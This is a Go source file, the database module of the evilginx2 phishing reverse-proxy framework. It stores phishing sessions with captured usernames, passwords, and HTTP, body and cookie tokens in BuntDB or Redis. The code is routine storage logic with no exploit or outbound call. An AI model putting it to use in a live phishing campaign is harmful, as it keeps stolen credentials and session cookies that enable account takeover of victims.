package database

import (
	"context"
	"encoding/json"
	"fmt"
	"strconv"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database/storage"
	"github.com/tidwall/buntdb"
)

type Database struct {
	path    string
	db      *buntdb.DB
	storage storage.Storage
	mu      sync.RWMutex
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	// Initialize BuntDB for backward compatibility
	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	// Initialize Redis storage if configured
	redisOpts := &storage.RedisOptions{
		Addr: "localhost:6379",
		TTL:  24 * time.Hour,
	}

	d.storage, err = storage.NewRedisStorage(redisOpts)
	if err != nil {
		// Fallback to BuntDB if Redis is not available
		d.storage = nil
	}

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	// Try Redis first if available
	if d.storage != nil {
		ctx := context.Background()
		return d.storage.CreateSession(ctx, sid, phishlet, landing_url, useragent, remote_addr)
	}

	// Fallback to BuntDB
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*storage.Session, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.ListSessions(ctx)
	}

	// Fallback to BuntDB
	sessions, err := d.sessionsList()
	if err != nil {
		return nil, err
	}

	// Convert to storage.Session
	result := make([]*storage.Session, len(sessions))
	for i, s := range sessions {
		// Convert CookieTokens
		cookieTokens := make(map[string]map[string]*storage.CookieToken)
		for domain, tokens := range s.CookieTokens {
			cookieTokens[domain] = make(map[string]*storage.CookieToken)
			for name, token := range tokens {
				cookieTokens[domain][name] = &storage.CookieToken{
					Name:     token.Name,
					Value:    token.Value,
					Path:     token.Path,
					HttpOnly: token.HttpOnly,
				}
			}
		}

		result[i] = &storage.Session{
			Id:           s.Id,
			Phishlet:     s.Phishlet,
			LandingURL:   s.LandingURL,
			Username:     s.Username,
			Password:     s.Password,
			Custom:       s.Custom,
			BodyTokens:   s.BodyTokens,
			HttpTokens:   s.HttpTokens,
			CookieTokens: cookieTokens,
			SessionId:    s.SessionId,
			UserAgent:    s.UserAgent,
			RemoteAddr:   s.RemoteAddr,
			CreateTime:   s.CreateTime,
			UpdateTime:   s.UpdateTime,
		}
	}

	return result, nil
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.UpdateUsername(ctx, sid, username)
	}

	return d.sessionsUpdateUsername(sid, username)
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.UpdatePassword(ctx, sid, password)
	}

	return d.sessionsUpdatePassword(sid, password)
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.UpdateCustom(ctx, sid, name, value)
	}

	return d.sessionsUpdateCustom(sid, name, value)
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.UpdateBodyTokens(ctx, sid, tokens)
	}

	return d.sessionsUpdateBodyTokens(sid, tokens)
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.UpdateHttpTokens(ctx, sid, tokens)
	}

	return d.sessionsUpdateHttpTokens(sid, tokens)
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*storage.CookieToken) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.UpdateCookieTokens(ctx, sid, tokens)
	}

	// Convert storage.CookieToken to local CookieToken
	localTokens := make(map[string]map[string]*CookieToken)
	for domain, domainTokens := range tokens {
		localTokens[domain] = make(map[string]*CookieToken)
		for name, token := range domainTokens {
			localTokens[domain][name] = &CookieToken{
				Name:     token.Name,
				Value:    token.Value,
				Path:     token.Path,
				HttpOnly: token.HttpOnly,
			}
		}
	}

	return d.sessionsUpdateCookieTokens(sid, localTokens)
}

func (d *Database) DeleteSession(sid string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		return d.storage.DeleteSession(ctx, sid)
	}

	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	return d.sessionsDelete(s.Id)
}

func (d *Database) DeleteSessionById(id int) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		// Redis does not support deletion by ID directly
		return fmt.Errorf("operation not supported")
	}

	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	return d.sessionsDelete(id)
}

func (d *Database) Flush() {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		ctx := context.Background()
		d.storage.Cleanup(ctx)
	}
	d.db.Shrink()
}

func (d *Database) Close() error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.storage != nil {
		d.storage.Close()
	}
	return d.db.Close()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
